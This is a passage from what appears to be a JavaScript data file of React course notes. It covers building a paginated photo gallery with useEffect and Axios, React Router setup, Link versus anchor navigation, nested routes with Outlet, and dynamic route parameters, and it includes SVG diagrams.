                    <text x="25" y="118" class="svg-mono-xs">• Browser automatically attaches to matching domain</text>
                    <text x="25" y="138" class="svg-mono-xs">• Protected via SameSite=Lax &amp; Secure HTTPS flags</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Industry standard for enterprise session auth</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 38
       ═══════════════════════════════════════════════════════════════ */
    {
      id: 'react-38',
      number: 38,
      shortLabel: 'React 38',
      title: 'Building the Gallery App (useEffect + Axios + Pagination)',
      summary: 'Architecting a real-world asynchronous Photo Gallery in Vite + Tailwind CSS: Managing dual state (userData and index), wiring declarative re-fetching with useEffect([index]), boundary guarding, and comparing page pagination with infinite scroll streams.',
      subtopicLabels: ["38.1 Setup & Architecture", "38.2 Fetching & Pagination", "38.3 Defensive Guarding", "38.4 Infinite Streams"],
      diagramCount: 2,
      sections: [
        {
          id: 'react-38-1',
          num: '38.1',
          title: 'Project Setup & Architectural Flow',
          content: `
            <p>
              In this hands-on project, we combine <strong>React State</strong>, <strong>Axios</strong>, and <strong>useEffect</strong> to engineer a paginated Photo Gallery consuming the Lorem Picsum public REST API:
            </p>
            <pre class="notes-code-block"><code>npm create vite@latest 08-gallery-app -- --template react
cd 08-gallery-app
npm install axios</code></pre>
            <p>
              The application dynamically interpolates the current page number into the query string using JavaScript template literals:
            </p>
            <pre class="notes-code-block"><code>'https://picsum.photos/v2/list?page=' + index + '&amp;limit=15'</code></pre>
          `
        },
        {
          id: 'react-38-2',
          num: '38.2',
          title: 'Complete Application Source Code (App.jsx)',
          content: `
            <pre class="notes-code-block"><code>import React, { useEffect, useState } from 'react'
import axios from 'axios'

const App = () => {
  // 1. Dual Reactive State Engine
  const [userData, setUserData] = useState([]) // Stores fetched photo objects
  const [index, setIndex] = useState(1)        // Current page counter (starts at 1)

  // 2. Asynchronous API Service Function
  const getData = async () => {
    try {
      const response = await axios.get(
        'https://picsum.photos/v2/list?page=' + index + '&limit=15'
      )
      setUserData(response.data) // Hydrate state array
    } catch (err) {
      console.error('Failed to load gallery assets:', err)
    }
  }

  // 3. Declarative Effect Trigger
  // Runs once on mount AND automatically re-runs whenever 'index' mutates
  useEffect(() => {
    getData()
  }, [index])

  // 4. Fallback / Loading UI Indicator
  let printUserData = &lt;h3 className="text-gray-400 font-mono"&gt;Loading Gallery Assets...&lt;/h3&gt;

  // 5. Array Mapping for Visual Card Grid
  if (userData.length &gt; 0) {
    printUserData = userData.map((item) =&gt; {
      return (
        &lt;div key={item.id} className="gallery-card rounded-lg overflow-hidden border shadow-sm"&gt;
          &lt;a href={item.url} target="_blank" rel="noreferrer"&gt;
            &lt;img 
              src={item.download_url} 
              alt={item.author} 
              className="w-full h-48 object-cover" 
            /&gt;
            &lt;div className="p-3"&gt;
              &lt;h4 className="font-semibold text-sm"&gt;{item.author}&lt;/h4&gt;
            &lt;/div&gt;
          &lt;/a&gt;
        &lt;/div&gt;
      )
    })
  }

  return (
    &lt;div className="max-w-6xl mx-auto p-6"&gt;
      &lt;h1 className="text-3xl font-bold mb-6"&gt;Engineering Gallery&lt;/h1&gt;

      {/* Gallery Cards Grid */}
      &lt;div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6 mb-8"&gt;
        {printUserData}
      &lt;/div&gt;

      {/* Pagination Controller */}
      &lt;div className="flex items-center justify-center gap-6"&gt;
        &lt;button
          disabled={index === 1}
          style={{ opacity: index === 1 ? 0.4 : 1 }}
          onClick={() =&gt; {
            if (index &gt; 1) {
              setUserData([])      // Purge stale photos to expose fallback state
              setIndex(prev =&gt; prev - 1) // Decrement page (triggers useEffect)
            }
          }}
          className="px-5 py-2 border rounded font-mono"
        &gt;
          Prev Page
        &lt;/button&gt;

        &lt;span className="font-mono font-bold"&gt;Page {index}&lt;/span&gt;

        &lt;button
          onClick={() =&gt; {
            setUserData([])      // Purge stale photos
            setIndex(prev =&gt; prev + 1) // Increment page (triggers useEffect)
          }}
          className="px-5 py-2 border rounded font-mono"
        &gt;
          Next Page
        &lt;/button&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  )
}

export default App</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 38.1 · Paginated Gallery Reactive Engine</span>
                <span class="diagram-frame-tag">REACTIVE PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="End to end reactive data pipeline showing user click, page index state mutation, useEffect trigger, Axios GET response, and DOM grid reconciliation">
                  <!-- Step 1: User Click -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 01</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Click 'Next'</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">setIndex(index + 1)</text>
                    <text x="25" y="114" class="svg-mono-xs">setUserData([])</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-muted);">Purges stale UI</text>
                  </g>

                  <!-- Step 2: Reactive Effect -->
                  <g transform="translate(245, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 02</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Effect Fires</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">useEffect([index])</text>
                    <text x="25" y="114" class="svg-mono-xs">Detects index: 1-&gt;2</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Calls getData() ✓</text>
                  </g>

                  <!-- Step 3: Axios Query -->
                  <g transform="translate(465, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 03</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Axios Stream</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">GET ?page=2&amp;limit=15</text>
                    <text x="25" y="114" class="svg-mono-xs">Awaits JSON array</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">15 Photo Objects</text>
                  </g>

                  <!-- Step 4: DOM Grid Paint -->
                  <g transform="translate(675, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 04</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Grid Paint</text>
                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">setUserData(data)</text>
                    <text x="25" y="114" class="svg-mono-xs">Virtual DOM diff</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">15 Cards Rendered ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          id: 'react-38-3',
          num: '38.3',
          title: 'Defensive State Clearing & Boundary Guard Patterns',
          content: `
            <p>
              Two critical engineering patterns are implemented in this gallery architecture:
            </p>
            <ul>
              <li><strong>Immediate State Clearing (<code>setUserData([])</code>):</strong> When switching pages over a high-latency network connection, stale cards from the previous page might linger on screen for 1–2 seconds before new cards arrive. Resetting the array immediately on click forces the component into its fallback state (<code>"Loading Gallery Assets..."</code>), preventing visual dissonance.</li>
              <li><strong>Boundary Guard (<code>if (index &gt; 1)</code>):</strong> Prevents invalid API requests (such as <code>page=0</code> or <code>page=-1</code>). Combining logic guards with the HTML <code>disabled={index === 1}</code> attribute and reduced opacity creates accessible, error-free navigation.</li>
            </ul>
          `
        },
        {
          id: 'react-38-4',
          num: '38.4',
          title: 'Production Concept: Discrete Pagination vs. Infinite Scrolling',
          content: `
            <p>
              In modern applications, content feeds (Instagram, Twitter, YouTube) utilize <strong>Infinite Scrolling</strong> rather than manual pagination buttons:
            </p>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 38.2 · Discrete Pagination vs. Continuous Infinite Scroll Architecture</span>
                <span class="diagram-frame-tag">STREAM COMPARISON</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Comparison diagram showing Discrete Page Navigation replacing state array vs Infinite Scrolling appending items via Intersection Observer">
                  <!-- Discrete Pagination -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DISCRETE PAGINATION</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Page-by-Page State Replacement</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">• Controlled via explicit Prev / Next buttons</text>
                    <text x="25" y="118" class="svg-mono-xs">• Overwrites state: setUserData(newPageItems)</text>
                    <text x="25" y="138" class="svg-mono-xs">• Memory constant: exactly 15 items in DOM</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Ideal for data tables &amp; administrative panels ✓</text>
                  </g>

                  <!-- Infinite Scrolling -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">INFINITE STREAMING</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Intersection Observer Accumulation</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">• Triggered when user scrolls to bottom sentinel</text>
                    <text x="25" y="118" class="svg-mono-xs">• Appends state: setUserData([...prev, ...next])</text>
                    <text x="25" y="138" class="svg-mono-xs">• Growing DOM footprint (requires virtual list)</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Standard for social media &amp; media feeds ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    }
,
    {
      id: "react-39-router-dom-spa-basics",
      number: "39",
      shortLabel: "React Router DOM & SPAs",
      title: "React Router DOM Basics & Single Page Applications (SPA)",
      summary: "Architecting modern Single Page Applications (SPAs): How client-side routing eliminates full-page browser reloads, HTML5 History API mechanics, setting up BrowserRouter, Routes, and wildcard 404 handlers.",
      subtopicLabels: ["39.1 Traditional MPA vs SPA", "39.2 BrowserRouter & Routes", "39.3 Link vs Anchor Tag"],
      diagramCount: 2,
      sections: [
        {
          num: "39.1",
          title: "Traditional Multi-Page Applications (MPA) vs. Single Page Applications (SPA)",
          content: `
            <p>
              In traditional web architecture (PHP, Django, standard HTML), clicking a navigation link (<code>&lt;a href="/about"&gt;</code>) triggers a full roundtrip to the web server:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Traditional MPA Bottleneck:</strong>
                <ul class="notes-sub-list">
                  <li>The browser initiates a full HTTP GET request, tears down the existing DOM, flushes all JavaScript memory, and downloads a brand-new HTML document.</li>
                  <li>The screen flashes white, stylesheets and scripts re-download, and user scroll position resets.</li>
                </ul>
              </li>
              <li><strong>The Single Page Application (SPA) Revolution:</strong>
                <ul class="notes-sub-list">
                  <li>In a React SPA, the browser loads a single HTML shell (<code>index.html</code>) once.</li>
                  <li>When a user navigates between pages, <strong>React Router DOM</strong> intercepts the URL change using the browser's <strong>HTML5 History API</strong> (<code>pushState</code> and <code>popState</code>).</li>
                  <li>Instead of requesting a new document from the server, React unmounts the old page component and mounts the new page component directly in the existing DOM—instantaneous, buttery smooth navigation with zero page reloads!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 39.1 · Multi-Page Application (MPA) vs. Single Page Application (SPA)</span>
                <span class="diagram-frame-tag">ROUTING ARCHITECTURE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Comparison between Multi-Page Applications requesting full HTML reloads vs Single Page Applications swapping components in Virtual DOM">
                  <!-- MPA -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="219" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
                    <text x="124.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">TRADITIONAL MPA (&lt;a href&gt;)</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Full Document Teardown</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">• User clicks &lt;a href="/about"&gt;</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">• Full HTTP document fetch + white flash</text>
                    <text x="25" y="138" class="svg-mono-xs">• Memory wiped: all React state lost</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Slow network round-trips for static shells</text>
                  </g>

                  <!-- SPA -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">REACT SPA (&lt;Link to&gt;)</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Client-Side Virtual DOM Swap</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">• Intercepts click: pushState(null, '', '/about') ✓</text>
                    <text x="25" y="118" class="svg-mono-xs">• Zero browser reload / zero white screen</text>
                    <text x="25" y="138" class="svg-mono-xs">• In-memory state &amp; caches preserved</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Instant component mounting &amp; 60fps UX</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "39.2",
          title: "Core Setup: BrowserRouter, Routes & Wildcard 404 Catch-All",
          content: `
            <p>
              To enable client-side routing in a React Vite application, we install <strong>React Router DOM</strong>:
            </p>

            <pre class="notes-code-block"><code>npm install react-router-dom</code></pre>

            <ul class="notes-bullet-list">
              <li><strong>Step 1: Wrap App with <code>&lt;BrowserRouter&gt;</code> in <code>main.jsx</code>:</strong>
                <pre class="notes-code-block"><code>import React from 'react';
import ReactDOM from 'react-dom/client';
import { BrowserRouter } from 'react-router-dom';
import App from './App.jsx';

// BrowserRouter connects your entire component tree to browser history
ReactDOM.createRoot(document.getElementById('root')).render(
  &lt;React.StrictMode&gt;
    &lt;BrowserRouter&gt;
      &lt;App /&gt;
    &lt;/BrowserRouter&gt;
  &lt;/React.StrictMode&gt;
);</code></pre>
              </li>
              <li><strong>Step 2: Declare Routes in <code>App.jsx</code>:</strong>
                <pre class="notes-code-block"><code>import React from 'react';
import { Routes, Route } from 'react-router-dom';
import Home from './pages/Home';
import About from './pages/About';
import Product from './pages/Product';
import NotFound from './pages/NotFound';

function App() {
  return (
    &lt;div className="min-h-screen bg-canvas text-text-primary"&gt;
      {/* Routes acts as a switch container, rendering the first matching Route */}
      &lt;Routes&gt;
        &lt;Route path="/" element={&lt;Home /&gt;} /&gt;
        &lt;Route path="/about" element={&lt;About /&gt;} /&gt;
        &lt;Route path="/product" element={&lt;Product /&gt;} /&gt;
        
        {/* Wildcard * catch-all renders custom 404 for any unmatched URL */}
        &lt;Route path="*" element={&lt;NotFound /&gt;} /&gt;
      &lt;/Routes&gt;
    &lt;/div&gt;
  );
}

export default App;</code></pre>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 39.2 · React Router DOM Tree Hierarchy &amp; Path Matching</span>
                <span class="diagram-frame-tag">PROVIDER TOPOLOGY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Hierarchy showing BrowserRouter wrapping App, containing Routes container and individual Route components mapping to pages">
                  <!-- BrowserRouter Provider -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="220" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="140" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="85" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">ROOT PROVIDER</text>
                    <text x="110" y="56" text-anchor="middle" class="svg-title">&lt;BrowserRouter&gt;</text>
                    <rect x="15" y="70" width="190" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">Wraps &lt;App /&gt;</text>
                    <text x="25" y="114" class="svg-mono-xs">Listens to popstate</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">History Context API</text>
                  </g>

                  <!-- Routes Container -->
                  <g transform="translate(270, 20)">
                    <rect x="0" y="0" width="250" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="120" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="75" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DISPATCHER</text>
                    <text x="125" y="56" text-anchor="middle" class="svg-title">&lt;Routes&gt; Switch</text>
                    <rect x="15" y="70" width="220" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">Diffs window.location</text>
                    <text x="25" y="114" class="svg-mono-xs">Executes path matching</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Selects best Route</text>
                  </g>

                  <!-- Route Branches -->
                  <g transform="translate(545, 20)">
                    <rect x="0" y="0" width="310" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="130" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="80" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PAGE TARGETS</text>
                    <text x="155" y="56" text-anchor="middle" class="svg-title">&lt;Route /&gt; Declarations</text>
                    <rect x="15" y="70" width="280" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">/          -&gt; &lt;Home /&gt;</text>
                    <text x="25" y="114" class="svg-mono-xs">/about     -&gt; &lt;About /&gt;</text>
                    <text x="25" y="134" class="svg-mono-xs">/product   -&gt; &lt;Product /&gt;</text>
                    <text x="25" y="150" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">*          -&gt; &lt;NotFound /&gt; (404)</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "39.3",
          title: "The Fatal &lt;a href&gt; Reload Trap vs. &lt;Link to&gt; & &lt;NavLink&gt;",
          content: `
            <p>
              The most critical rule of client-side routing: <strong>Never use standard HTML <code>&lt;a href="..."&gt;</code> tags for internal navigation in React!</strong>
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Why <code>&lt;a href&gt;</code> Destroys React SPAs:</strong>
                <ul class="notes-sub-list">
                  <li>In native HTML, clicking <code>&lt;a href="/about"&gt;</code> commands the browser to initiate a full document reload.</li>
                  <li>All in-memory React state (e.g. <code>useState</code> values, user session tokens, active timers, form drafts) is instantly flushed down the drain!</li>
                </ul>
              </li>
              <li><strong>The Solution — <code>&lt;Link to&gt;</code> & <code>&lt;NavLink to&gt;</code>:</strong>
                <ul class="notes-sub-list">
                  <li><code>&lt;Link to="/about"&gt;</code> cancels the browser's default document reload, updates the URL bar via <code>history.pushState()</code>, and tells React Router to swap page components in memory.</li>
                  <li><strong><code>&lt;NavLink&gt;</code>:</strong> Specialized variant for navigation bars. Automatically injects an <code>active</code> class or gives you an <code>isActive</code> boolean prop to highlight the currently active tab!</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React from 'react';
import { NavLink } from 'react-router-dom';

function Navbar() {
  return (
    &lt;nav className="flex gap-6 p-4 border-b bg-surface"&gt;
      {/* NavLink automatically exposes isActive state */}
      &lt;NavLink 
        to="/" 
        className={({ isActive }) => 
          isActive ? 'text-emerald-600 font-bold border-b-2 border-emerald-600' : 'text-text-muted hover:text-text-primary'
        }
      &gt;
        Home
      &lt;/NavLink&gt;

      &lt;NavLink 
        to="/about" 
        className={({ isActive }) => 
          isActive ? 'text-emerald-600 font-bold border-b-2 border-emerald-600' : 'text-text-muted hover:text-text-primary'
        }
      &gt;
        About
      &lt;/NavLink&gt;

      &lt;NavLink 
        to="/product" 
        className={({ isActive }) => 
          isActive ? 'text-emerald-600 font-bold border-b-2 border-emerald-600' : 'text-text-muted hover:text-text-primary'
        }
      &gt;
        Products
      &lt;/NavLink&gt;
    &lt;/nav&gt;
  );
}

export default Navbar;</code></pre>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 40
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-40-advanced-routing-nested-dynamic",
      number: "40",
      shortLabel: "Advanced Routing & Layouts",
      title: "Advanced Routing (Nested, Dynamic & Programmatic)",
      summary: "Mastering production routing patterns in React Router DOM: Building sub-page layouts with Nested Routes and &lt;Outlet /&gt;, reading dynamic URL parameters via useParams(), and redirecting imperatively with useNavigate().",
      subtopicLabels: ["40.1 Nested Routes & Outlet", "40.2 Dynamic useParams()", "40.3 useNavigate() Redirects"],
      diagramCount: 2,
      sections: [
        {
          num: "40.1",
          title: "Nested Routes & The &lt;Outlet /&gt; Layout Architecture",
          content: `
            <p>
              In enterprise web applications (such as dashboards, admin panels, or e-commerce suites), sub-pages frequently share a persistent parent shell—such as a side navigation bar, header, or search bar—that must stay mounted while only the inner content region swaps.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Power of Nested Routes:</strong>
                <ul class="notes-sub-list">
                  <li>In React Router DOM, you can nest <code>&lt;Route&gt;</code> elements inside a parent <code>&lt;Route&gt;</code>.</li>
                  <li><strong>The <code>&lt;Outlet /&gt;</code> Component:</strong> Inside the parent component, place <code>&lt;Outlet /&gt;</code> where you want the child route components to appear. Think of <code>&lt;Outlet /&gt;</code> as a placeholder or window frame where matching child routes render!</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>// App.jsx — Nested Route Configuration:
import { Routes, Route } from 'react-router-dom';
import ProductLayout from './pages/ProductLayout';
import MensClothing from './pages/MensClothing';
import WomensClothing from './pages/WomensClothing';

function App() {
  return (
    &lt;Routes&gt;
      {/* Parent route renders ProductLayout shell */}
      &lt;Route path="/product" element={&lt;ProductLayout /&gt;}&gt;
        {/* Child routes render inside ProductLayout's &lt;Outlet /&gt; */}
        &lt;Route path="mens" element={&lt;MensClothing /&gt;} /&gt;
        &lt;Route path="womens" element={&lt;WomensClothing /&gt;} /&gt;
      &lt;/Route&gt;
    &lt;/Routes&gt;
  );
}</code></pre>

            <pre class="notes-code-block"><code>// pages/ProductLayout.jsx:
import { Outlet, Link } from 'react-router-dom';

function ProductLayout() {
  return (
    &lt;div className="p-6"&gt;
      &lt;h2 className="text-2xl font-bold mb-4"&gt;Product Catalog Hub&lt;/h2&gt;
      
      {/* Shared sub-navigation menu */}
      &lt;div className="flex gap-4 border-b pb-3 mb-6"&gt;
        &lt;Link to="/product/mens" className="font-semibold text-emerald-600"&gt;Men's Section&lt;/Link&gt;
        &lt;Link to="/product/womens" className="font-semibold text-emerald-600"&gt;Women's Section&lt;/Link&gt;
      &lt;/div&gt;

      {/* &lt;Outlet /&gt; renders MensClothing or WomensClothing dynamically! */}
      &lt;div className="bg-card p-6 border rounded-xl"&gt;
        &lt;Outlet /&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  );
}

export default ProductLayout;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 40.1 · Nested Route Topology &amp; &lt;Outlet /&gt; Slot Projection</span>
                <span class="diagram-frame-tag">LAYOUT PROJECTION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Visual representation of Parent Product layout containing persistent navigation while Outlet dynamically projects Men or Women child components">
                  <!-- Parent Shell -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="189" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="109.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PARENT SHELL: /product</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Persistent Layout Frame</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">Shared Header: &lt;h1&gt;Product Catalog&lt;/h1&gt;</text>
                    <text x="25" y="118" class="svg-mono-xs">Sub-Navigation: [Men] [Women]</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">&lt;Outlet /&gt; Projection Slot</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Never unmounts during child navigation</text>
                  </g>

                  <!-- Dynamic Child Slot -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">OUTLET PROJECTION</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Conditional Child Mounting</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">URL = /product/men   -&gt; Mounts &lt;Men /&gt;</text>
                    <text x="25" y="118" class="svg-mono-xs">URL = /product/women -&gt; Mounts &lt;Women /&gt;</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Zero full-page remounting overhead ✓</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Targeted Virtual DOM reconciliation</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "40.2",
          title: "Dynamic URL Parameters & The useParams() Hook",
          content: `
            <p>
              In real-world applications, you cannot hardcode a route for every product or user (e.g. <code>/user/1</code>, <code>/user/2</code>... <code>/user/100000</code>). Instead, we declare <strong>Dynamic Routes</strong> with colon parameters:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Declaring Dynamic Parameters:</strong>
                <br><code>&lt;Route path="/user/:username" element={&lt;UserProfile /&gt;} /&gt;</code>
                <br>The colon <code>:username</code> tells React Router: <em>"Treat this segment of the URL as a dynamic variable named username."</em>
              </li>
              <li><strong>Extracting Parameters with <code>useParams()</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Inside the rendered component, call <code>const { username } = useParams();</code>.</li>
                  <li>React Router extracts the string value directly from the browser's active URL bar! You can immediately use this parameter to fetch data from an API.</li>
                </ul>
              </li>
            </ul>

